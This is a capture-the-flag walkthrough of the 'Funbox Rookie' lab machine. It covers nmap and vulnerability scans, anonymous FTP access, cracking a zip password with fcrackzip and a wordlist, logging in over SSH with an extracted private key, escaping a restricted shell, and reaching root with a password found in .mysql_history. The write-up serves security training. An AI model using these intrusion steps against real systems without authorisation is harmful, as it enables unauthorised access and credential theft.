# Funbox-rookie


## Scanning

**nmap target-ip**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled.png)

Service version scan= **nmap -sV -A target-ip**

```jsx
root@kali:~# nmap -sV -A 192.168.122.120
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-02-08 03:02 EST
Nmap scan report for 192.168.122.120
Host is up (0.00083s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:95:F5:06 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms 192.168.122.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
root@kali:~#
```

Vulnerability scan= **nmap -sV -A --script vuln target-ip**

```jsx
root@kali:~# nmap -sV -A --script vuln 192.168.122.120
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-02-08 03:04 EST
Nmap scan report for 192.168.122.120
Host is up (0.0014s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
|_sslv2-drown: 
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5e: 
|     	SAINT:950EB68D408A40399926A4CCAD3CC62E	10.0	https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E	*EXPLOIT*
|     	SAINT:63FB77B9136D48259E4F0D4CDA35E957	10.0	https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957	*EXPLOIT*
|     	SAINT:1B08F4664C428B180EEC9617B41D9A2C	10.0	https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C	*EXPLOIT*
|     	PROFTPD_MOD_COPY	10.0	https://vulners.com/canvas/PROFTPD_MOD_COPY	*EXPLOIT*
|     	PACKETSTORM:132218	10.0	https://vulners.com/packetstorm/PACKETSTORM:132218	*EXPLOIT*
|     	PACKETSTORM:131567	10.0	https://vulners.com/packetstorm/PACKETSTORM:131567	*EXPLOIT*
|     	PACKETSTORM:131555	10.0	https://vulners.com/packetstorm/PACKETSTORM:131555	*EXPLOIT*
|     	PACKETSTORM:131505	10.0	https://vulners.com/packetstorm/PACKETSTORM:131505	*EXPLOIT*
|     	MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC	10.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC	*EXPLOIT*
|     	EDB-ID:37262	10.0	https://vulners.com/exploitdb/EDB-ID:37262	*EXPLOIT*
|     	EDB-ID:36803	10.0	https://vulners.com/exploitdb/EDB-ID:36803	*EXPLOIT*
|     	EDB-ID:36742	10.0	https://vulners.com/exploitdb/EDB-ID:36742	*EXPLOIT*
|     	CVE-2015-3306	10.0	https://vulners.com/cve/CVE-2015-3306
|     	1337DAY-ID-23720	10.0	https://vulners.com/zdt/1337DAY-ID-23720*EXPLOIT*
|     	1337DAY-ID-23544	10.0	https://vulners.com/zdt/1337DAY-ID-23544*EXPLOIT*
|     	SSV:61050	5.0	https://vulners.com/seebug/SSV:61050	*EXPLOIT*
|     	CVE-2019-19272	5.0	https://vulners.com/cve/CVE-2019-19272
|     	CVE-2019-19271	5.0	https://vulners.com/cve/CVE-2019-19271
|     	CVE-2019-19270	5.0	https://vulners.com/cve/CVE-2019-19270
|     	CVE-2019-18217	5.0	https://vulners.com/cve/CVE-2019-18217
|     	CVE-2016-3125	5.0	https://vulners.com/cve/CVE-2016-3125
|     	CVE-2013-4359	5.0	https://vulners.com/cve/CVE-2013-4359
|_    	CVE-2017-7418	2.1	https://vulners.com/cve/CVE-2017-7418
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	1337DAY-ID-32009	0.0	https://vulners.com/zdt/1337DAY-ID-32009*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937*EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502*EXPLOIT*
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-10081	5.0	https://vulners.com/cve/CVE-2019-10081
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
MAC Address: 00:0C:29:95:F5:06 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.45 ms 192.168.122.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.21 seconds
root@kali:~#
```

## Enumeration

**PORT 21 — FTP**

**ftp target-ip**

Login using anonymous:anonymous

ls

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%201.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%201.png)

Download [tom.zip](http://tom.zip) using command **get tom.zip**

**fcarckzip -u D -p '/usr/share/wordlists/rockyou.txt' tom.zip**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%202.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%202.png)

Found password iubire

## Exploitation

**unzip [tom.zip](http://tom.zip) and enter password iubire**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%203.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%203.png)

We found private key

**cat id_rsa**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%204.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%204.png)

**ssh -i id_rsa tom@target-ip**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%205.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%205.png)

Successfully connected using tom user to ssh

Using same process for other zip file.

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%206.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%206.png)

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%207.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%207.png)

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%208.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%208.png)

## Privilege Esclation

**echo $SHELL**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%209.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%209.png)

**ssh -i id_rsa tom@target-ip -t "bash —noprofile"**

**ls -al**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2010.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2010.png)

**cat .mysql_history**

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2011.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2011.png)

Found some password 

**sudo su**

Entering password 

***We got shell of root user.

![Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2012.png](Funbox%20Rookie%2012f60b704ccd4b708256c3c0d685a7b0/Untitled%2012.png)
